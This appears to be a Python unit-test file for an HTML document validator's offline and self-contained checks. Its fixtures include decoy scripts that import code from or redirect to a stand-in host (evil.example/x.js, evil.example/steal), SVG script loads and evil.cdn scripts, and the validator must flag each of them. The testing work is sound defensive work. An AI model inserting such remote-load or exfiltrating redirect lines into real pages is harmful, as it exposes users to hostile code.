from _validate_helpers import *


class NewCheckTests(unittest.TestCase):
    """Coverage for the self-contained-guarantee, embedded-comment schema, duplicate-heading,
    canvas-report-all, and --strict additions."""

    def _body(self, main, *extra):
        return [HANDLED_REGION, EMBEDDED_REGION, comment_ui(), main] + list(extra) + [JS_REGION]

    def _errs_warns(self, content):
        return _validate_text(content)

    # -- self-contained guarantee -------------------------------------------------- #
    def test_external_img_src_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="https://example.com/x.png" alt="x">')
        errors, _ = self._errs_warns(build(body=self._body(main)))
        self.assertTrue(any("loads over the network" in e for e in errors), errors)

    def test_local_path_img_warns_not_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)

    def test_data_uri_img_is_clean(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="data:image/png;base64,AAAA" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_external_script_src_errors(self):
        errors, _ = self._errs_warns(build(body=self._body(MAIN, '<script src="https://evil.cdn/x.js"></script>')))
        self.assertTrue(any("self-contained guarantee" in e for e in errors), errors)

    def test_chartjs_cdn_script_is_exempt_from_self_contained_error(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, script)))
        self.assertFalse(any("self-contained guarantee" in e for e in errors), errors)

    def test_offline_mode_rejects_chartjs_cdn_script(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        doc = with_offline_mode(build(body=self._body(MAIN, script)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "Chart.js" in e for e in errors), errors)

    def test_offline_mode_rejects_network_resources_and_css_imports(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://cdn.example.com/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }")
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="https://example.com/x.png" alt="x">\n'
            '<iframe src="https://example.com/f.html"></iframe>\n'
            '<video poster="https://example.com/poster.png"><track src="https://example.com/c.vtt"></video>')
        extras = [
            '<link rel="stylesheet" href="https://example.com/app.css">',
            '<script src="https://example.com/app.js"></script>',
        ]
        doc = with_offline_mode(build(css=css, body=self._body(main, *extras)))
        errors, _ = self._errs_warns(doc)
        for needle in ("<img", "<iframe", "<video", "<track", "<link", "<script", "@import"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline error for %s, got %r" % (needle, errors))

    def test_offline_mode_accepts_inlined_data_resources(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="data:image/png;base64,AAAA" alt="x">\n'
            '<video poster="data:image/png;base64,AAAA"></video>')
        doc = with_offline_mode(build(body=self._body(main)))
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_requires_restrictive_csp(self):
        errors, _ = self._errs_warns(with_offline_mode(build(), csp=False))
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        weak = with_offline_mode(build()).replace("form-action 'none'; ", "", 1)
        errors, _ = self._errs_warns(weak)
        self.assertTrue(any("form-action 'none'" in e for e in errors), errors)

    def test_offline_mode_rejects_network_form_actions(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<form action="https://example.com/post"><button formaction="//example.com/button">Send</button>'
            '<input formaction="https://example.com/input" value="Send"></form>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(main))))
        for needle in ("<form action", "<button formaction", "<input formaction"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline form error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_network_meta_refresh(self):
        doc = with_offline_mode(build(body=self._body(MAIN, '<meta http-equiv="refresh" content="0; url=https://example.com/out">')))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)

    def test_offline_mode_rejects_network_css_urls(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            ":root { --cp-bg: #ffffff; --cp-text: #000000; background-image: url(https://example.com/bg.png); }")
        main = MAIN.replace("<p>content</p>", '<p style="background: url(//example.com/inline.png)">content</p>')
        errors, _ = self._errs_warns(with_offline_mode(build(css=css, body=self._body(main))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            "expected offline CSS url error for %s, got %r" % (needle, errors))

    def test_offline_mode_allows_non_fetching_network_links(self):
        links = (
            '<link rel="canonical" href="https://example.com/report">\n'
            '<link rel="alternate" href="https://example.com/report.atom" type="application/atom+xml">\n'
            '<link rel="author" href="https://example.com/about">'
        )
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, links))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An offline export used to skip four reserved layer ids BEFORE testing whether the script
    # was runnable, so a decoy that merely borrowed one bypassed both of its strips (#822). The
    # validator never had that skip, which is the asymmetry that let the exporter preserve a
    # script its own --strict gate then rejected. Pin the validator side in both directions so a
    # future "make them agree" change cannot resolve the disagreement by adding the skip here.
    def test_offline_egress_check_exempts_no_reserved_layer_id(self):
        reserved = ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "cmhVendoredRichLibs", "reviewedSections")
        for rid in reserved:
            with self.subTest(reserved_id=rid):
                decoy = ('<script type="text/javascript" id="%s">\n'
                         'import("https://evil.example/x.js");\n'
                         '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, decoy))))
                self.assertTrue(any("imports a network module" in e for e in errors), (rid, errors))
                nav = ('<script type="text/javascript" id="%s">\n'
                       'window.location.href = "https://evil.example/steal";\n'
                       '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
                self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))

    # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
    # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
    # validator must keep accepting the repaired shape.
    def test_offline_egress_check_ignores_an_inert_reserved_block_quoting_egress(self):
        quote = ('<script type="application/json" id="reviewedSections">\n'
                 '{"x": "import(\\"https://evil.example/x.js\\") and location.href = '
                 '\\"https://evil.example/steal\\""}\n'
                 '</script>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, quote))))
        self.assertFalse(any("imports a network module" in e or "direct top-level " in e for e in errors), errors)

    # An SVG <script> loads through `href` (SVG2) or the legacy `xlink:href`, never `src`, so the
    # resource check missed it entirely and blessed such a file as offline-clean (#881). The
    # exporter strips the same shape, so the gate has to see it too or the two disagree. The
    # padded value is browser-real: a URL parser strips leading whitespace before it parses, so
    # ` https://...` loads - and the exporter's own predicate trims, so a validator that did not
    # would bless a file the strip had cleaned.
    def test_offline_mode_rejects_an_svg_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.js", "//evil.example/x.js",
                        " \t https://evil.example/x.js"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><script %s="%s"></script></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<script %s" % attr in e for e in errors),
                                    (attr, url, errors))

    # Borrowing a reserved layer id buys no exemption from the LOAD check either: the exporter
    # neutralizes such a block into inert data, but a remote load is what the strip removes outright,
    # so the gate must flag it rather than read the id and look away.
    def test_offline_mode_rejects_a_reserved_id_svg_script_that_loads_through_href(self):
        for rid in ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "reviewedSections", "cmhVendoredRichLibs"):
            with self.subTest(reserved_id=rid):
                svg = ('<svg><script id="%s" href="https://evil.example/x.js"></script></svg>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (rid, errors))

    def test_offline_mode_accepts_a_relative_or_data_svg_script_reference(self):
        svg = ('<svg><script href="svg-local-keep.js"></script>'
               '<script xlink:href="data:text/javascript,void%200"></script></svg>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The self-contained guarantee is not offline-only: a shareable document that loads a script
    # over the network is an error however the load is spelled.
    def test_shareable_mode_rejects_a_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/x.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # The Chart.js CDN opt-in is bound to `src`, because `check_charts` only validates a `src`
    # loader's pinned version and SRI. Exempting an `href` would wave through a remote script with
    # a chart-shaped filename that nothing else in the validator ever looks at.
    def test_the_chartjs_cdn_exemption_does_not_extend_to_a_script_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/z/chart.min.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    def test_external_stylesheet_link_warns(self):
        link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("self-contained guarantee" in w for w in warnings), warnings)

    # -- duplicate heading ids --------------------------------------------- #
    def test_duplicate_heading_ids_warn(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <h2 id="dup">A</h2>\n  <p>x</p>\n  <h2 id="dup">B</h2>\n</main>')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("duplicate heading id" in w for w in warnings), warnings)

    # -- embeddedComments per-item schema ---------------------------------- #
    def _embedded(self, payload):
        return ("<!--\nBEGIN: commentable-html - EMBEDDED COMMENTS\n-->\n"
                '<script type="application/json" id="embeddedComments">' + payload + "</script>\n"
                "<!-- END: commentable-html - EMBEDDED COMMENTS -->")

    def test_embedded_comment_item_bad_id_errors(self):
        body = [HANDLED_REGION, self._embedded('[{"id": null, "note": "x"}]'), comment_ui(), MAIN, JS_REGION]
        errors, _ = self._errs_warns(build(body=body))
        self.assertTrue(any("missing or unsafe id" in e for e in errors), errors)

    def test_embedded_comment_item_valid_id_is_clean(self):
        body = [HANDLED_REGION, self._embedded('[{"id": "cabc123", "note": "hi"}]'), comment_ui(), MAIN, JS_REGION]
        errors, warnings = self._errs_warns(build(body=body))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # -- canvas aria: report ALL offenders in one pass --------------------- #
    def test_multiple_canvases_missing_aria_reported_together(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <div class="cm-skip"><canvas id="c1"></canvas></div>\n'
                '  <div class="cm-skip"><canvas id="c2"></canvas></div>\n</main>')
        render = '<script>var x = document.getElementById("c1").getContext("2d");</script>'
        errors, warnings = self._errs_warns(build(body=self._body(main, render)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("2 of 2 <canvas>" in w for w in warnings), warnings)

    # -- --strict CLI ------------------------------------------------------- #
    def test_strict_flag_fails_on_warnings_only(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        content = build(body=self._body(main))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r_plain = subprocess.run([sys.executable, VALIDATE_PY, p], capture_output=True, text=True)
            self.assertEqual(r_plain.returncode, 0, r_plain.stdout + r_plain.stderr)
            self.assertIn("WARNING", r_plain.stdout)
            r_strict = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p], capture_output=True, text=True)
            self.assertEqual(r_strict.returncode, 1, r_strict.stdout + r_strict.stderr)
            self.assertIn("strict", r_strict.stdout.lower())


if __name__ == "__main__":
    unittest.main()
